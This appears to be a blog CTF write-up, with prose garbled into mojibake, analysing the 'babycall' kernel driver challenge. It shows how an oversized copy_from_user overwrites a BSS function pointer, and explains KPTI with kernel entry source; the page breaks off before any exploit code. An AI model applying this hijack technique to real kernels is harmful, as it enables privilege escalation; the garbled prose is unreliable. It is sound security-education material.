<!DOCTYPE html>
<html lang="en-us">
    
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="theme-color" content="dark">
    <title> é€šè¿‡DASCTF&amp;HWSèµ›é¢˜babycallæ¥æ¢ç©¶ç»•è¿‡KPTIä¿æŠ¤ | FMYY&#39;S Note</title>
    
    
    
    <link rel="stylesheet" href="/sass/main.min.96090b4177a3194fa2de0860f2c55524d6582b68a41222fe4030905ef033075a.css">
</head>

    <body class="dark">
        <nav class="navbar">
    <div class="container">
        <div class="flex">
            <div>
                <a class="brand" href="/">
                    
                    <span class="emoji">
                        ğŸ˜
                    </span>
                    
                    FMYY&#39;S Note
                    </a>
            </div>
            <div class="flex">
                
                <a href="/articles/">Articles</a>
                
                <button id="dark-mode-button"></button>
            </div>
            </div>
    </div>
</nav>
        <main>
            

<div class="container">
    <article>
        <header class="article-header">
            <div class="thumb">
                <div>
                    <h1>é€šè¿‡DASCTF&amp;HWSèµ›é¢˜babycallæ¥æ¢ç©¶ç»•è¿‡KPTIä¿æŠ¤</h1>
                    <div class="post-meta">
                        <div>
                            By  on <time>February 01, 2021</time>
                        </div>
                        <div class="tags">
                            
                            <a href="/tags/kernel/">Kernel</a>
                            
                            <a href="/tags/kpti/">KPTI</a>
                            
                            <a href="/tags/dasctf/">DASCTF</a>
                            
                        </div>
                    </div>
                </div>
            </div>
        </header>
    </article>

    <div class="article-post">
    <p>é¢˜ç›®æ˜¯DASCTF2021å¹´1æœˆæœ«è”åˆHWSå‡ºçš„é¢˜,å…¶ä¸­babycallæœ‰ä¸ªä»¥å‰æ²¡æ³¨æ„åˆ°çš„è€ƒç‚¹,ä¸‹é¢ä»¥åˆ†ææ­¤é¢˜æ¥æ¢ç©¶å¦‚ä½•ç»•è¿‡KPTIä¿æŠ¤</p>
<h3 id="é¢˜ç›®åˆ†æ">é¢˜ç›®åˆ†æ</h3>
<h4 id="qemuå¯åŠ¨è„šæœ¬">Qemuå¯åŠ¨è„šæœ¬</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="cp">#!/bin/bash
</span><span class="cp"></span>qemu-system-x86_64 <span class="se">\
</span><span class="se"></span>-s <span class="se">\
</span><span class="se"></span>-initrd rootfs.img <span class="se">\
</span><span class="se"></span>-kernel bzImage <span class="se">\
</span><span class="se"></span>-append <span class="s2">&#34;console=ttyS0 root=/dev/sda rw nokaslr quiet&#34;</span> <span class="se">\
</span><span class="se"></span>-monitor /dev/null -m 128M -nographic <span class="se">\
</span><span class="se"></span>-cpu kvm64,+smep
</code></pre></td></tr></table>
</div>
</div><p>å¼€å¯ä»¥ä¸‹ä¿æŠ¤</p>
<pre><code>SMEP:  ç®¡ç†æ¨¡å¼æ‰§è¡Œä¿æŠ¤,ä¿æŠ¤å†…æ ¸æ˜¯å…¶ä¸å…è®¸æ‰§è¡Œç”¨æˆ·ç©ºé—´ä»£ç 
</code></pre>
<p>è€Œå¦‚ä½•æŸ¥çœ‹æ˜¯å¦å­˜åœ¨ä¸€äº›CPUä¿æŠ¤å‘¢ï¼Ÿ</p>
<pre><code>é€šè¿‡ cat /sys/devices/system/cpu/vulnerabilities/* å‘½ä»¤æŸ¥çœ‹vulnerabilitiesç›®å½•ä¸‹å­˜åœ¨çš„CPUæ¼æ´

&quot;Not affected&quot;	: å½“å‰ CPU ä¸å­˜åœ¨è¯¥æ¼æ´
&quot;Vulnerable&quot;	: å½“å‰ CPU å­˜åœ¨è¯¥æ¼æ´ä¸”æœªé‡‡å–ç›¸åº”ç¼“è§£æªæ–½
&quot;Mitigation: $M&quot;: å½“å‰ CPU å­˜åœ¨è¯¥æ¼æ´ä½†é‡‡å–äº†ç›¸åº”ç¼“è§£æªæ–½
</code></pre>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-bash" data-lang="bash">/ $ cat /sys/devices/system/cpu/vulnerabilities/*
Mitigation: PTE Inversion
Vulnerable: Clear CPU buffers attempted, no microcode<span class="p">;</span> SMT Host state unknown
Mitigation: PTI
Vulnerable
Mitigation: usercopy/swapgs barriers and __user pointer sanitization
Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
</code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥å‘ç°å½“å‰å†…æ ¸å…¶å®å¼€å¯äº†PTIä¿æŠ¤çš„,ä»¥ä¸Šé¢çš„å‘½ä»¤æŸ¥çœ‹å³å¯çŸ¥é“,QEMUå¯åŠ¨è„šæœ¬ä¸èƒ½æŸ¥çœ‹åˆ°æ‰€æœ‰ä¿æŠ¤</p>
<h4 id="babycall_ioctl">babycall_ioctl</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">size_t</span> <span class="n">babycall_ioctl</span><span class="p">(</span><span class="n">file</span> <span class="o">*</span><span class="n">filp</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">user_ptr</span><span class="p">)</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="cmd--0x10001-write_to_kernel">CMD == 0x10001 write_to_kernel</h4>
<p>æŸ¥çœ‹ä¸‹æ±‡ç¼–å³å¯å‘ç°,è°ƒç”¨äº†vulæŒ‡é’ˆ,è€Œåœ¨babycall_initä¸­,vulæŒ‡é’ˆæŒ‡å‘äº†writemsgå‡½æ•°,æ‰€ä»¥<code>CMD=0x10001</code>æ˜¯è°ƒç”¨writemsgå‡½æ•°,ä¼ å…¥å‚æ•°RDIå¯æ§ä¸ºuser_ptr</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">mov</span>     <span class="no">rax</span><span class="p">,</span> <span class="no">cs</span><span class="p">:</span><span class="no">vuln</span>
<span class="nf">call</span>    <span class="no">__x86_indirect_thunk_rax</span> <span class="err">//</span> <span class="err">==</span> <span class="no">call</span> <span class="no">RAX</span>
</code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">int</span> <span class="nf">writemsg</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">user_ptr</span><span class="p">)</span>
<span class="p">{</span>
	<span class="n">ptr</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>
	<span class="n">size</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">src</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="mh">0x20</span> <span class="o">&amp;&amp;</span> <span class="n">src</span> <span class="o">&amp;&amp;</span> <span class="o">*</span><span class="n">src</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="n">Ptr</span> <span class="o">=</span> <span class="n">src</span><span class="p">;</span>
		<span class="n">num_address</span> <span class="o">=</span> <span class="n">key</span><span class="p">;</span> <span class="c1">// key[0] = 0x0F0E0E0B0D0A0E0Dh;
</span><span class="c1"></span>		<span class="k">while</span> <span class="p">(</span> <span class="mi">1</span> <span class="p">)</span>
		<span class="p">{</span>
			<span class="n">num</span> <span class="o">=</span> <span class="o">*</span><span class="n">num_address</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span> <span class="o">!*</span><span class="n">num_address</span> <span class="p">)</span>
				<span class="k">break</span><span class="p">;</span>
			<span class="o">++</span><span class="n">ptr</span><span class="p">;</span>
			<span class="o">++</span><span class="n">num_address</span><span class="p">;</span>
			<span class="k">if</span> <span class="p">(</span> <span class="n">num</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="n">ptr</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="o">!*++</span><span class="n">Ptr</span> <span class="p">)</span>
				<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
		<span class="p">}</span>
		<span class="n">Size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
		<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">size_t</span><span class="p">)</span><span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x20</span> <span class="p">)</span>
		<span class="p">{</span>
			<span class="n">_warn_printk</span><span class="p">(</span><span class="s">&#34;Buffer overflow detected (%d &lt; %lu)!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">8LL</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
			<span class="n">BUG</span><span class="p">();</span>
		<span class="p">}</span>
		<span class="n">_check_object_size</span><span class="p">(</span><span class="n">BSS_Ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">0LL</span><span class="p">);</span>
		<span class="n">copy_from_user</span><span class="p">(</span><span class="n">BSS_Ptr</span><span class="p">,</span> <span class="n">Ptr</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="cmd--0x10002-read_from_kernel">CMD == 0x10002 read_from_kernel</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span> <span class="n">cmd</span> <span class="o">==</span> <span class="mh">0x10002</span> <span class="p">)</span>
<span class="p">{</span>
	<span class="n">size</span> <span class="o">=</span> <span class="n">strnlen</span><span class="p">(</span><span class="n">BSS_Ptr</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">);</span>
	<span class="n">Size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
	<span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">&gt;</span> <span class="mh">0x20</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="n">fortify_panic</span><span class="p">(</span><span class="s">&#34;strnlen&#34;</span><span class="p">,</span> <span class="mh">0x20LL</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">!=</span> <span class="mh">0x20</span> <span class="p">)</span>
	<span class="p">{</span>
		<span class="n">_check_object_size</span><span class="p">(</span><span class="n">BSS_Ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="mi">1LL</span><span class="p">);</span>
		<span class="k">return</span> <span class="nf">copy_to_user</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="n">BSS_Ptr</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
	<span class="p">}</span>
	<span class="n">fortify_panic</span><span class="p">(</span><span class="s">&#34;strlen&#34;</span><span class="p">,</span> <span class="mh">0x20LL</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><h4 id="æ¼æ´ç‚¹">æ¼æ´ç‚¹</h4>
<p><code>CMD == 0x10001</code>ä¸­ <code>copy_from_user(BSS_Ptr, Ptr, Size);</code>,è€Œåœ¨é©±åŠ¨BSSæ®µä¸Šé¢</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000000007</span><span class="mi">80</span> <span class="p">;</span> <span class="kt">char</span> <span class="n">BSS_Ptr</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span>
<span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000000007</span><span class="mi">80</span> <span class="n">BSS_Ptr</span>
<span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000000007</span><span class="mi">88</span> <span class="p">;</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">vuln</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span>
<span class="p">.</span><span class="nl">bss</span><span class="p">:</span><span class="mo">00000000000007</span><span class="mi">88</span> <span class="n">vuln</span>
</code></pre></td></tr></table>
</div>
</div><p>å‘ç°å†™å…¥åˆ°BSSä¸Šçš„æ•°æ®æœ€é•¿0x20ä¸ªå­—èŠ‚,å¯ä»¥è¦†ç›–vulnæŒ‡é’ˆ,ä¹‹å‰æœ‰è®²<code>CMD == 0x10001</code>æ—¶å€™,è°ƒç”¨çš„æ˜¯vulnå‡½æ•°æŒ‡é’ˆ,æ‰€ä»¥ç¬¬ä¸€æ¬¡<code>ioctl</code>äº¤äº’å¯ä»¥ä¿®æ”¹BSSä¸Švulnå‡½æ•°æŒ‡é’ˆ</p>
<h3 id="about-kpti--bypass-kpti">About KPTI &amp;&amp; Bypass KPTI</h3>
<p>KPTI(Kernel PageTable Isolation,ç®€ç§°PTI)å…¨ç§°å†…æ ¸é¡µè¡¨éš”ç¦»,æ—¨åœ¨æ›´å¥½åœ°éš”ç¦»ç”¨æˆ·ç©ºé—´ä¸å†…æ ¸ç©ºé—´çš„å†…å­˜æ¥æé«˜å®‰å…¨æ€§,ç¼“è§£ç°ä»£x86 CPUä¸­çš„&quot;ç†”æ¯&quot;ç¡¬ä»¶å®‰å…¨ç¼ºé™·.</p>
<p>ç”±äºKPTIå‰èº«KAISERä¸­,ä¸€ä¸ªè¿›ç¨‹åœ°å€ç©ºé—´è¢«åˆ†ä¸ºå†…æ ¸åœ°å€ç©ºé—´å’Œç”¨æˆ·åœ°å€ç©ºé—´,å†…æ ¸åœ°å€ç©ºé—´æ˜ å°„åˆ°æ•´ä¸ªç‰©ç†å†…å­˜ç©ºé—´ä¸­,ç”¨æˆ·åœ°å€ç©ºé—´åªèƒ½æŒ‡å®šæ˜ å°„åˆ°ç›¸åº”çš„ç‰©ç†åœ°å€ç©ºé—´.å†…æ ¸åœ°å€ç©ºé—´å’Œç”¨æˆ·åœ°å€ç©ºé—´å› ä¸ºå…±ç”¨åŒä¸€ä¸ªé¡µç›®å½•è¡¨,å¯¼è‡´äº†meltdownæ¼æ´,æ•…KPTIåœ¨æ¯ä¸€ä¸ªè¿›ç¨‹ä¸­ä½¿ç”¨äº†ä¸¤ä¸ªé¡µç›®å½•è¡¨,å°†ç”¨æˆ·åœ°å€ç©ºé—´å’Œå†…æ ¸åœ°å€ç©ºé—´éš”ç».</p>
<h4 id="å½±å­åœ°å€ç©ºé—´shadowaddressspaces">å½±å­åœ°å€ç©ºé—´(ShadowAddressSpaces)</h4>
<p>KPTIä¸­æ¯ä¸ªè¿›ç¨‹æœ‰ä¸¤ä¸ªåœ°å€ç©ºé—´,ç¬¬ä¸€ä¸ªåœ°å€ç©ºé—´åªèƒ½åœ¨å†…æ ¸æ€ä¸‹è®¿é—®,å¯ä»¥åˆ›å»ºåˆ°å†…æ ¸å’Œç”¨æˆ·çš„æ˜ å°„ï¼ˆä¸è¿‡ç”¨æˆ·ç©ºé—´å—SMAPå’ŒSMEPä¿æŠ¤).ç¬¬äºŒä¸ªåœ°å€ç©ºé—´è¢«ç§°ä¸ºå½±å­åœ°å€ç©ºé—´ï¼ŒåªåŒ…å«ç”¨æˆ·ç©ºé—´.ä¸è¿‡ç”±äºæ¶‰åŠåˆ°ä¸Šä¸‹æ–‡åˆ‡æ¢ï¼Œæ‰€ä»¥åœ¨å½±å­åœ°å€ç©ºé—´ä¸­å¿…é¡»åŒ…å«éƒ¨åˆ†å†…æ ¸åœ°å€,ç”¨æ¥å»ºç«‹åˆ°ä¸­æ–­å…¥å£å’Œå‡ºå£çš„æ˜ å°„.</p>
<p>å½“ä¸­æ–­åœ¨ç”¨æˆ·æ€å‘ç”Ÿæ—¶,æ¶‰åŠåˆ°åˆ‡æ¢CR3å¯„å­˜å™¨,ä»å½±å­åœ°å€ç©ºé—´åˆ‡æ¢åˆ°ç”¨æˆ·æ€çš„åœ°å€ç©ºé—´.ä¸­æ–­ä¸ŠåŠéƒ¨çš„è¦æ±‚æ˜¯å°½å¯èƒ½çš„å¿«,ä»è€Œåˆ‡æ¢CR3è¿™ä¸ªæ“ä½œä¹Ÿè¦æ±‚å°½å¯èƒ½çš„å¿«.ä¸ºäº†è¾¾åˆ°è¿™ä¸ªç›®çš„ï¼ŒKPTIä¸­å°†å†…æ ¸ç©ºé—´çš„PGDå’Œç”¨æˆ·ç©ºé—´çš„PGDè¿ç»­çš„æ”¾ç½®åœ¨ä¸€ä¸ª8KBçš„å†…å­˜ç©ºé—´ä¸­.è¿™æ®µç©ºé—´å¿…é¡»æ˜¯8Kå¯¹é½çš„,æ•…CR3çš„åˆ‡æ¢æ“ä½œè½¬æ¢ä¸ºå°†CR3å€¼çš„ç¬¬13ä½(ç”±ä½åˆ°é«˜)çš„ç½®ä½æˆ–æ¸…é›¶æ“ä½œ,æé«˜äº†CR3åˆ‡æ¢çš„é€Ÿåº¦.
<img src="http://file.elecfans.com/web1/M00/48/41/pIYBAFqnjauALEa7AABj4HgT7UA066.png" alt=""></p>
<h4 id="syscall--kernel-419164">SYSCALL [ Kernel 4.19.164]</h4>
<p>æ ¹æ®<code>Intel SDM</code>,syscallä¼šå°†å½“å‰RIPå­˜åˆ°RCX,ç„¶åå°†<code>IA32_LSTAR</code>åŠ è½½åˆ°RIP.åŒæ—¶å°†<code>IA32_STAR[47:32]</code>åŠ è½½åˆ°CS,<code>IA32_STAR[47:32] + 8</code>åŠ è½½åˆ° SS (åœ¨ GDT ä¸­,SS å°±è·Ÿåœ¨ CS åé¢).</p>
<p><code>MSR IA32_LSTAR (MSR_LSTAR)</code>å’Œ<code>IA32_STAR (MSR_STAR)</code>åœ¨<code>arch/x86/kernel/cpu/common.c</code>çš„<code>syscall_init</code>ä¸­åˆå§‹åŒ–</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="kt">void</span> <span class="nf">syscall_init</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
	<span class="k">extern</span> <span class="kt">char</span> <span class="n">_entry_trampoline</span><span class="p">[];</span>
	<span class="k">extern</span> <span class="kt">char</span> <span class="n">entry_SYSCALL_64_trampoline</span><span class="p">[];</span>

	<span class="kt">int</span> <span class="n">cpu</span> <span class="o">=</span> <span class="n">smp_processor_id</span><span class="p">();</span>
	<span class="kt">unsigned</span> <span class="kt">long</span> <span class="n">SYSCALL64_entry_trampoline</span> <span class="o">=</span>
		<span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">get_cpu_entry_area</span><span class="p">(</span><span class="n">cpu</span><span class="p">)</span><span class="o">-&gt;</span><span class="n">entry_trampoline</span> <span class="o">+</span>
		<span class="p">(</span><span class="n">entry_SYSCALL_64_trampoline</span> <span class="o">-</span> <span class="n">_entry_trampoline</span><span class="p">);</span>

	<span class="n">wrmsr</span><span class="p">(</span><span class="n">MSR_STAR</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="p">(</span><span class="n">__USER32_CS</span> <span class="o">&lt;&lt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">|</span> <span class="n">__KERNEL_CS</span><span class="p">);</span>
	<span class="k">if</span> <span class="p">(</span><span class="n">static_cpu_has</span><span class="p">(</span><span class="n">X86_FEATURE_PTI</span><span class="p">))</span>
		<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_LSTAR</span><span class="p">,</span> <span class="n">SYSCALL64_entry_trampoline</span><span class="p">);</span>
	<span class="k">else</span>
		<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_LSTAR</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">entry_SYSCALL_64</span><span class="p">);</span>

<span class="cp">#ifdef CONFIG_IA32_EMULATION
</span><span class="cp"></span>	<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_CSTAR</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">entry_SYSCALL_compat</span><span class="p">);</span>
	<span class="cm">/*
</span><span class="cm">	 * This only works on Intel CPUs.
</span><span class="cm">	 * On AMD CPUs these MSRs are 32-bit, CPU truncates MSR_IA32_SYSENTER_EIP.
</span><span class="cm">	 * This does not cause SYSENTER to jump to the wrong location, because
</span><span class="cm">	 * AMD doesn&#39;t allow SYSENTER in long mode (either 32- or 64-bit).
</span><span class="cm">	 */</span>
	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_CS</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">__KERNEL_CS</span><span class="p">);</span>
	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_ESP</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)(</span><span class="n">cpu_entry_stack</span><span class="p">(</span><span class="n">cpu</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">));</span>
	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_EIP</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">entry_SYSENTER_compat</span><span class="p">);</span>
<span class="cp">#else
</span><span class="cp"></span>	<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_CSTAR</span><span class="p">,</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span><span class="p">)</span><span class="n">ignore_sysret</span><span class="p">);</span>
	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_CS</span><span class="p">,</span> <span class="p">(</span><span class="n">u64</span><span class="p">)</span><span class="n">GDT_ENTRY_INVALID_SEG</span><span class="p">);</span>
	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_ESP</span><span class="p">,</span> <span class="mi">0ULL</span><span class="p">);</span>
	<span class="n">wrmsrl_safe</span><span class="p">(</span><span class="n">MSR_IA32_SYSENTER_EIP</span><span class="p">,</span> <span class="mi">0ULL</span><span class="p">);</span>
<span class="cp">#endif
</span><span class="cp"></span>
	<span class="cm">/* Flags to clear on syscall */</span>
	<span class="n">wrmsrl</span><span class="p">(</span><span class="n">MSR_SYSCALL_MASK</span><span class="p">,</span>
	       <span class="n">X86_EFLAGS_TF</span><span class="o">|</span><span class="n">X86_EFLAGS_DF</span><span class="o">|</span><span class="n">X86_EFLAGS_IF</span><span class="o">|</span>
	       <span class="n">X86_EFLAGS_IOPL</span><span class="o">|</span><span class="n">X86_EFLAGS_AC</span><span class="o">|</span><span class="n">X86_EFLAGS_NT</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></td></tr></table>
</div>
</div><p>å¯ä»¥çœ‹åˆ°<code>MSR_STAR</code>çš„<code>ç¬¬32-47ä½</code>è®¾ç½®ä¸º<code>Kernel mode</code>çš„ CS,<code>ç¬¬48-63</code>ä½è®¾ç½®ä¸º<code>User mode</code>çš„ CS.è€Œ<code>IA32_LSTAR</code>è¢«è®¾ç½®ä¸ºå‡½æ•°<code>entry_SYSCALL_64</code>çš„èµ·å§‹åœ°å€.
äºæ˜¯ syscall æ—¶,è·³è½¬åˆ°<code>entry_SYSCALL_64</code>å¼€å§‹æ‰§è¡Œ,å…¶å®šä¹‰åœ¨ <code>arch/x86/entry/entry_64.S</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span></code></pre></td>
<td class="lntd">
<pre class="chroma"><code class="language-C" data-lang="C"><span class="n">ENTRY</span><span class="p">(</span><span class="n">entry_SYSCALL_64</span><span class="p">)</span>
	<span class="n">UNWIND_HINT_EMPTY</span>
	<span class="cm">/*
</span><span class="cm">	 * Interrupts are off on entry.
</span><span class="cm">	 * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,
</span><span class="cm">	 * it is too small to ever cause noticeable irq latency.
</span><span class="cm">	 */</span>

	<span class="n">swapgs</span>
	<span class="cm">/*
</span><span class="cm">	 * This path is only taken when PAGE_TABLE_ISOLATION is disabled so it
</span><span class="cm">	 * is not required to switch CR3.
</span><span class="cm">	 */</span>
	<span class="n">movq</span>	<span class="o">%</span><span class="n">rsp</span><span class="p">,</span> <span class="n">PER_CPU_VAR</span><span class="p">(</span><span class="n">rsp_scratch</span><span class="p">)</span>
	<span class="n">movq</span>	<span class="n">PER_CPU_VAR</span><span class="p">(</span><span class="n">cpu_current_top_of_stack</span><span class="p">),</span> <span class="o">%</span><span class="n">rsp</span>

	<span class="cm">/* Construct struct pt_regs on stack */</span>
	<span class="n">pushq</span>	<span class="err">$</span><span class="n">__USER_DS</span>					<span class="cm">/* pt_regs-&gt;ss */</span>
	<span class="n">pushq</span>	<span class="n">PER_CPU_VAR</span><span class="p">(</span><span class="n">rsp_scratch</span><span class="p">)</span>	<span class="cm">/* pt_regs-&gt;sp */</span>
